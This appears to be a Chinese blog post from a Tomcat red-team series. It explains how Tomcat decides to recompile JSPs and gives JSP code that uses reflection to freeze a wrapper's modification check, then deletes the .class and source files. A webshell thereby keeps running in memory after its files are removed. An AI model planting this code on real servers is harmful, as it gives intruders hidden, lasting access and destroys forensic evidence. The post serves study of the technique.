# Tomcat容器攻防笔记之JSP金蝉脱壳

阅读量 **211006**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-12-08 10:30:21

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

背景：

基于现阶段红蓝对抗强度的提升，诸如WAF动态防御、态势感知、IDS恶意流量分析监测、文件多维特征监测、日志监测等手段，能够及时有效地检测、告警甚至阻断针对传统通过文件上传落地的Webshell或需以文件形式持续驻留目标服务器的恶意后门。

结合当下的形势，尝试下在Tomcat容器中，寻找能为我们渗透测试提供便利的特性。

声明 ：

由于传播或利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，此文仅作交流学习用途。

* * *

历史文章：

[Tomcat容器攻防笔记之Filter内存马](https://mp.weixin.qq.com/s/nPAje2-cqdeSzNj4kD2Zgw)

[Tomcat容器攻防笔记之Servlet内存马](https://mp.weixin.qq.com/s/rEjBeLd8qi0_t_Et37rAng)

* * *

## 一、金蝉脱壳怎么讲？

在Tomcat中，JSP被看作是一种特殊的servlet，当我们请求JSP时，Tomcat会对jsp进行编译，生成相应的class文件。在我们渗透测试的过程中通过文件上传令jsp落地，动静太大，Webshell的痕迹太过于明显，容易被管理员发现并删除，而当JSP文件被删除后，Webshell就失效了。当然也可以通过其他组合拳，打入内存马或以其他形式做权限维持。

这次我们根据Tomcat对Jsp的处理流程来看看，有没有什么办法，当服务器将JSP删除后，我们的webshell仍能维持运作？

## 二、Tomcat基本的Servlet有哪些？

通过查看配置文件/conf/web.xml，可以得知Tomcat含有两个默认的servlet。分别是DefaultServlet以及JspServlet。

![](https://p4.ssl.qhimg.com/t01c31d057f08603510.png)

对于Tomcat而言，当一个请求进入时，若没有匹配到任何在/WEB-INF/Web.xml中定义的Servlet，则最终会流经至这两个默认的Servlet。

其中，DefaultServlet主要用于处理静态资源如HTML、图片、CSS以及JS文件等，为了提高服务器性能，Tomcat会对访问文件进行缓存，并且按照配置中的Url-Pattern，客户端请求资源的路径，跟资源的物理路径应当是一致的，当然如果只想加载static目录下的资源，这里也可以将DefaultServlet的路径匹配限制为“/static/”，关于DefaultServlet不再赘述。

那么，JspServlet主要负责处理对于JSP文件以及JSPX文件的请求，如此一来，我们就知道了，处理对于.jsp和*.jspx的请求，调用的是Servlet是JspServlet。

## 三、JspServlet的调用过程和逻辑细节

不知道各位还有没有印象，我们Servlet，在哪个时候、哪个过程、哪个类中才被调用。如果忘记了可以重新翻阅一下《[Tomcat容器攻防笔记之Filter内存马](https://mp.weixin.qq.com/s/nPAje2-cqdeSzNj4kD2Zgw)》以及《[Tomcat容器攻防笔记之Servlet内存马](https://mp.weixin.qq.com/s/rEjBeLd8qi0_t_Et37rAng)》两篇文章。  
其实，就是在ApplicationFilterChain调用Filter对请求执行一遍过滤逻辑之后，开始对Servlet进行调用。

![](https://p1.ssl.qhimg.com/t01414e16ed1775a5de.png)

具体在ApplicationFilterChain#internalDoFilter方法中的this.servlet.service(request,
response)。这里的this是ApplicationFilterChain

![](https://p3.ssl.qhimg.com/t017e31a2f738a2e0c9.png)

我们继续来看JspServlet#service()，前面一段是获取当前请求的Jsp路径，比方说请求“/webapp/index.jsp”,那么这里就获取的是jspUri
= “/index.jsp”

![](https://p3.ssl.qhimg.com/t01927c124c947c71a9.png)

this.preCompile(request)就是判断一下有没有预编译，我们关注点在jsp的刷新机制，这里影响不大，继续往下看。

![](https://p0.ssl.qhimg.com/t0119006bdbe99e5cca.png)

进入JspServlet#serviceJspFile()方法，this.rctxt指代JspRuntimeContext类，它是Tomcat后台定期检查JSP文件是否变动的类，若有变动则对JSP文件重新编译。

![](https://p0.ssl.qhimg.com/t01b0af54fc4f834ccb.png)

在JspRuntimeContext的成员属性jsps中，记录的与jspUri对应的Wrapper，这个wrapper逻辑上对应jsp经编译后得到的servlet

![](https://p3.ssl.qhimg.com/t0192a2ad05f086193e.png)

那么第一个if逻辑，做的是一个匹配，匹配到了就返回Wrapper。

往下看，wrapper.service(),这里进入JspServletWrapper的service方法。

![](https://p5.ssl.qhimg.com/t01a08f40e3df863f1f.png)

Tomcat默认处于开发模式，而生产模式下的Tomcat，Jsp更新后需要重启服务才可以生效，这里将进入this.ctxt.compile()。

此处this.ctxt调用的是JspCompilationContext类，该类主要是记录用于JSP解析引擎的各类数据。当前我们在JspServletWrapper类中，调用compile()方法是为了确认当前访问的jsp是否需要重新编译。

![](https://p3.ssl.qhimg.com/t01ceea997aa5997fb1.png)

因此当进入Compile()中时，关键的逻辑就是this.jspCompiler.isOutDated()，检查Jsp更新。这里顺带讲讲，Tomcat对于Jsp使用的编译器，来看看this.createCompiler()。

![](https://p4.ssl.qhimg.com/t016a9af1151fea4bdc.png)

逻辑比较简单，先看看配置文件有没有定义编译器，没有就默认采用JDTcompiler。

![](https://p4.ssl.qhimg.com/t014c4fc0762b016e80.png)

直接来看isOutDated()吧，既然这里是判断我们访问的JSP文件有没有更新，在这里搞点事情做点手脚欺骗一下Tomcat让它误以为没有更新。

这里是核心步骤，在讲解之前，要先补充点其他的内容。上文中，我们提及到JspRuntimeContext类，Jsp文件经过编译并包装后得到的JspServletWrapper实例，其实保存在JspRuntimeContext#jsps中。

当我们访问JSP文件时，Tomcat将从JspRuntimeContext#logs中，根据我们请求的路径找到相应的JspServletWrapper，如果没有找到，就进行加载编译，并添加入jsps中，无论是新编译好的还是旧编译好的，依旧会调用此时得到的JspServletWrapper#service()方法，此时真正响应请求的servlet其实已随JspServletWrapper，保存在jsps中。

经过上面分析，最终会去到isOutDated方法。如果我们删除了Jsp文件，则该方法必然返回true，Tomcat将对jsp文件进行重新编译，如果没找到jsp文件，则报FileNotFoundException。

那么，真正实现代码逻辑功能的servlet已经在jsps中安安静静躺好了，要想实现删除掉Jsp文件，但仍然让servlet”高枕无忧”，就要令isOutDataed的第一个If逻辑直接返回false（这个If逻辑比较容易处理）

![](https://p2.ssl.qhimg.com/t01398c638be086c36d.png)

来看，this.jsw等同于JspServletWrapper，前两个条件明显成立，ModificationTestInterval的值默认为4，jsw是对我们请求响应的JspServlet。

后面判断JspServletWrapper的LastModificationTest加上4*1000 是否大于系统当前时间，成立则返回false。

我一看this.jsw.getLastModificationTest()，啪的一下，很快嗷，有没有朋友已经反应过来了，利用Java反射机制动态修改实例中的运行数据，将LastModificationTest更改为一个足够大的值，使得这个条件永成立，就可以使得Tomcat认为我们的JSP文件至始至终不曾更变。

这里是long型，可能有的朋友一瞅，阿我直接整个long型最大值，使得这个条件永真。留意还有额外的变量要添加，超过最大值会得到一个负数，令这个条件永假。

## 四、编写代码

按照惯例，导入包一览：

    
    
    <%@ page import="java.lang.reflect.Field" %>
    <%@ page import="org.apache.catalina.mapper.MappingData" %>
    <%@ page import="org.apache.catalina.connector.Request" %>
    <%@ page import="org.apache.catalina.Wrapper" %>
    <%@ page import="org.apache.jasper.compiler.JspRuntimeContext" %>
    <%@ page import="java.util.HashMap" %>
    <%@ page import="java.util.concurrent.ConcurrentHashMap" %>
    <%@ page import="org.apache.jasper.servlet.JspServletWrapper" %>
    <%@ page import="org.apache.jasper.JspCompilationContext" %>
    <%@ page import="java.io.File" %>
    

无尽的反射,request里的MappingData东西是真的全,下列反射的类不知道为什么的要这么做的可以看看上述关于jsps的图：

    
    
    <%
        Field requestF = request.getClass().getDeclaredField("request");
        requestF.setAccessible(true);
        Request req = (Request) requestF.get(request);
    
        MappingData mappingData = req.getMappingData();
        Field wrapperF = mappingData.getClass().getDeclaredField("wrapper");
        wrapperF.setAccessible(true);
        Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);
    
        Field instanceF = wrapper.getClass().getDeclaredField("instance");
        instanceF.setAccessible(true);
        Servlet jspServlet = (Servlet) instanceF.get(wrapper);
    
        Field rctxt = jspServlet.getClass().getDeclaredField("rctxt");
        rctxt.setAccessible(true);
        JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet);
    
        Field jspsF = jspRuntimeContext.getClass().getDeclaredField("jsps");
        jspsF.setAccessible(true);
        ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext);
    
        JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath());
        jsw.setLastModificationTest(8223372036854775807L);
    
    JspCompilationContext ctxt = jsw.getJspEngineContext();
        File targetFile;
        targetFile = new File(ctxt.getClassFileName());//删掉jsp的.class
        targetFile.delete();
        targetFile = new File(ctxt.getServletJavaFileName());//删掉jsp自身
        targetFile.delete();
    
    %>
    

## 五、看看效果

![](https://p2.ssl.qhimg.com/t01ba40b8784a71ae53.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **鲸落** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/224698](/post/id/224698)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Tomcat](/tag/Tomcat)
  * [webshell](/tag/webshell)

 **+1** __6赞

 __收藏

![](https://p5.ssl.qhimg.com/t0180afe1d6131dd030.png) 鲸落

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

